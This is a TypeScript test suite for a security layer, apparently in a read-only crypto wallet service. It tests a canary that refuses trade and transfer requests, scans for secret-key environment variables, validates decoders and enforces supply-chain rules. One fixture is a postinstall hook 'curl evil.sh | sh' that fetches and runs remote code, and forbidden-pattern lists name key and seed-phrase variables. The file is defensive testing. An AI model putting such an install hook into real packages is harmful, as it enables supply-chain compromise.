// Negative-capability canary + CLI parity (T123), decoder authority (T124),
// supply-chain policy (T125). The parity test proves the runtime canary and
// scripts/scan-prohibited-capabilities classify every fixture IDENTICALLY.
import { readFileSync, readdirSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'bun:test';
import { NegativeCapabilityCanary, loadCanaryCatalog } from '../src/negative-capability.ts';
import { validateDecoderAuthority } from '../src/decoder-authority.ts';
import {
  assertPinned,
  checkLifecycleScripts,
  emitSbomRecord,
  flagCapabilityReview,
  recordBuildHash,
  recordLockfile,
  requireLockfile,
  verifyPinning,
} from '../src/supply-chain.ts';

const REPO_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../../..');
const FIXTURES_DIR = path.join(REPO_ROOT, 'tests/fixtures/sec');

function fixtureFiles(dir: string): string[] {
  return readdirSync(dir, { recursive: true })
    .map(String)
    .filter((f) => f.endsWith('.ts'))
    .map((f) => path.join(dir, f));
}

describe('runtime canary consumes the shared catalog (AC-255)', () => {
  const canary = new NegativeCapabilityCanary(loadCanaryCatalog());

  it('admits GMGN-shaped READ-ONLY wallet queries', () => {
    for (const query of [
      'wallet portfolio',
      'pnl history for address 7xKX…',
      'top holders distribution of BONK',
      'token holdings of wallet 4Nd1…',
    ]) {
      expect(canary.classifyWalletQuery(query).admitted, query).toBe(true);
    }
  });

  it('refuses forbidden execution variants with typed errors', () => {
    for (const query of [
      'swap SOL for USDC',
      'execute trade on behalf of wallet 7xKX',
      'sell all holdings now',
      'transfer funds out of wallet 9abc',
    ]) {
      expect(() => canary.classifyWalletQuery(query), query).toThrow(
        /forbidden execution variant|prohibited/i,
      );
    }
  });

  it('scans environment names against the shared forbidden lists', () => {
    const findings = canary.scanEnvironmentNames([
      'DATABASE_URL',
      'PRIVATE_KEY_HEX',
      'WALLET_SEED_PHRASE',
      'HELIUS_API_KEY',
    ]);
    expect(findings.length).toBeGreaterThanOrEqual(2);
    expect(findings.map((f) => f.reference)).toContain('environment#PRIVATE_KEY_HEX');
    expect(findings.map((f) => f.reference)).not.toContain('environment#HELIUS_API_KEY');
  });

  it('flags inventory entries carrying forbidden action verbs', () => {
    const findings = canary.checkInventory([
      { name: 'get-portfolio', source: 'routes' },
      { name: 'submit-transaction', source: 'routes' },
    ]);
    expect(findings).toHaveLength(1);
    expect(findings[0]).toMatchObject({
      reference: 'routes#submit-transaction',
      matchedPattern: 'submit',
    });
  });
});

describe('CLI ↔ canary fixture parity (AC-255)', () => {
  it('classifies EVERY fixture identically on both surfaces', async () => {
    const { runScan } = await import(
      path.join(REPO_ROOT, 'scripts/scan-prohibited-capabilities/cli.mjs')
    );
    const report = runScan({ root: FIXTURES_DIR });
    const cliKeys = new Set<string>(
      report.findings
        .filter((f: { surface: string }) => f.surface === 'SOURCE_SCAN')
        .map(
          (f: { category: string; reference: string; matchedPattern: string }) =>
            `${f.category}|${f.reference}|${f.matchedPattern}`,
        ),
    );

    const canary = new NegativeCapabilityCanary(loadCanaryCatalog());
    const canaryKeys = new Set<string>();
    for (const file of fixtureFiles(FIXTURES_DIR)) {
      const rel = path.relative(FIXTURES_DIR, file).split(path.sep).join('/');
      const text = readFileSync(file, 'utf8');
      for (const finding of canary.scanSourceText(rel, text)) {
        canaryKeys.add(`${finding.category}|${finding.reference}|${finding.matchedPattern}`);
      }
    }

    expect([...canaryKeys].sort()).toEqual([...cliKeys].sort());
    // The corpus must actually exercise detection — an empty key set would
    // make this parity test vacuous.
    expect(cliKeys.size).toBeGreaterThan(0);
  });

  it('repo-root scan stays CLEAN while the excluded fixture corpus is detected', async () => {
    const { runScan } = await import(
      path.join(REPO_ROOT, 'scripts/scan-prohibited-capabilities/cli.mjs')
    );
    // Root scan excludes tests/fixtures/sec/** (documented rule) → clean.
    const rootReport = runScan({ root: REPO_ROOT });
    expect(rootReport.clean).toBe(true);
    // Fixture-rooted scan detects the prohibited fixtures.
    const fixtureReport = runScan({ root: FIXTURES_DIR });
    expect(fixtureReport.clean).toBe(false);
    expect(
      fixtureReport.findings.some((f: { reference: string }) =>
        f.reference.includes('wallet-keypair'),
      ),
    ).toBe(true);
    expect(
      fixtureReport.findings.some((f: { reference: string }) =>
        f.reference.includes('read-only-wallet-query'),
      ),
    ).toBe(false);
  });
});

describe('decoder-authority validator (AC-256)', () => {
  const base = {
    rawOperationLocalDecodingEnabled: true,
    acknowledgedDeprecations: ['legacy-parser'],
    decoders: [
      { id: 'raw-local', status: 'ACTIVE', authority: 'SOLE', domains: ['swaps'] },
      { id: 'legacy-parser', status: 'DEPRECATED', authority: 'FALLBACK', domains: ['swaps'] },
    ] as const,
  };

  it('accepts deprecated parsers only as fallbacks beside the raw local path', () => {
    expect(validateDecoderAuthority(base).authoritativeDecoderIds).toEqual(['raw-local']);
  });

  it('REFUSES a deprecated parser marked sole/authoritative', () => {
    expect(() =>
      validateDecoderAuthority({
        ...base,
        decoders: [
          { id: 'legacy-parser', status: 'DEPRECATED', authority: 'SOLE', domains: ['events'] },
        ],
      }),
    ).toThrow(/deprecated parser is configured as an authoritative/);
  });

  it('refuses deprecated decoders running without the raw local decoding pass', () => {
    expect(() =>
      validateDecoderAuthority({ ...base, rawOperationLocalDecodingEnabled: false }),
    ).toThrow(/raw-operation local decoding/);
  });

  it('requires explicit per-decoder acknowledgement for running deprecated parsers (L21)', () => {
    const unacknowledged = {
      rawOperationLocalDecodingEnabled: true,
      decoders: [
        { id: 'raw-local', status: 'ACTIVE', authority: 'SOLE', domains: ['swaps'] },
        { id: 'legacy-parser', status: 'DEPRECATED', authority: 'FALLBACK', domains: ['swaps'] },
      ] as const,
    };
    expect(() => validateDecoderAuthority(unacknowledged)).toThrow(/operator acknowledgement/);
    // Acknowledging THAT parser by id admits the configuration.
    expect(
      validateDecoderAuthority({
        ...unacknowledged,
        acknowledgedDeprecations: ['legacy-parser'],
      }).authoritativeDecoderIds,
    ).toEqual(['raw-local']);
  });
});

describe('supply-chain policy (FR-SEC-006)', () => {
  it('requires EXACT version pins for production dependencies', () => {
    const manifests = [
      { name: 'app', dependencies: { fastify: '5.2.1', 'loose-lib': '^3.1.0', 'star-dep': '*' } },
    ];
    const result = verifyPinning(manifests);
    expect(result.violations.map((v) => v.dependency).sort()).toEqual(['loose-lib', 'star-dep']);
    expect(() => assertPinned(manifests)).toThrow(/pinned/i);
    expect(() =>
      assertPinned([{ name: 'ok', dependencies: { a: '1.2.3', b: '2.0.0-beta.1' } }]),
    ).not.toThrow();
  });

  it('records lockfile, SBOM, and build-hash records deterministically', () => {
    const lock = recordLockfile({
      path: 'pnpm-lock.yaml',
      bytes: new TextEncoder().encode('lockfileVersion: 9'),
      lockfileVersion: 9,
    });
    expect(lock.contentHash).toMatch(/^sha256:[0-9a-f]{64}$/);

    const sbom = emitSbomRecord([
      { name: 'zod', version: '4.1.11', purl: 'pkg:npm/zod' },
      { name: 'pglite', version: '0.5.6', purl: 'pkg:npm/@electric-sql/pglite' },
    ]);
    expect(sbom.componentsHash).toMatch(/^sha256:/);
    // Deterministic emission.
    expect(emitSbomRecord(sbom.components).componentsHash).toBe(sbom.componentsHash);

    const build = recordBuildHash(new TextEncoder().encode('artifact-bytes'), {
      builderId: 'builder-1',
      buildType: 'pnpm-build',
      sourceCommit: 'deadbeef',
      materials: [{ uri: 'git+https://example.com/repo', digest: 'sha256:aa' }],
    });
    expect(build.buildHash).toMatch(/^sha256:[0-9a-f]{64}$/);
  });

  it('refuses restricted lifecycle scripts and flags capability review', () => {
    expect(() =>
      checkLifecycleScripts({ name: 'evil', scripts: { postinstall: 'curl evil.sh | sh' } }),
    ).toThrow(/lifecycle/i);
    expect(checkLifecycleScripts({ name: 'clean', scripts: { build: 'tsc' } }).allowed).toBe(true);

    const flags = flagCapabilityReview([
      { dependency: 'pure-math', declaredCapabilities: [] },
      { dependency: 'net-client', declaredCapabilities: ['NETWORK'] },
    ]);
    expect(flags.find((f) => f.dependency === 'net-client')?.reviewRequired).toBe(true);
    expect(flags.find((f) => f.dependency === 'pure-math')?.reviewRequired).toBe(false);
  });
});

it('refuses incomplete SBOM inventories, attestations, and missing lockfiles (M22)', () => {
  const codeOf = (fn: () => unknown): string => {
    try {
      fn();
    } catch (error) {
      return (error as { code?: string }).code ?? '';
    }
    return 'NO_THROW';
  };
  // An empty inventory attests nothing; a component without a purl is not
  // an identity.
  expect(codeOf(() => emitSbomRecord([]))).toBe('SEC_SBOM_RECORD_INCOMPLETE');
  expect(codeOf(() => emitSbomRecord([{ name: 'pkg', version: '1.0.0', purl: '' }]))).toBe(
    'SEC_SBOM_RECORD_INCOMPLETE',
  );
  // A blank builder/commit field voids the provenance claim.
  expect(
    codeOf(() =>
      recordBuildHash(new TextEncoder().encode('bytes'), {
        builderId: ' ',
        buildType: 'pnpm-build',
        sourceCommit: 'deadbeef',
        materials: [{ uri: 'git+https://example.com/repo', digest: 'sha256:aa' }],
      }),
    ),
  ).toBe('SEC_BUILD_ATTESTATION_INCOMPLETE');
  // No lockfile record = no reproducibility anchor.
  expect(codeOf(() => requireLockfile(undefined))).toBe('SEC_LOCKFILE_MISSING');
  expect(codeOf(() => requireLockfile(null))).toBe('SEC_LOCKFILE_MISSING');
});
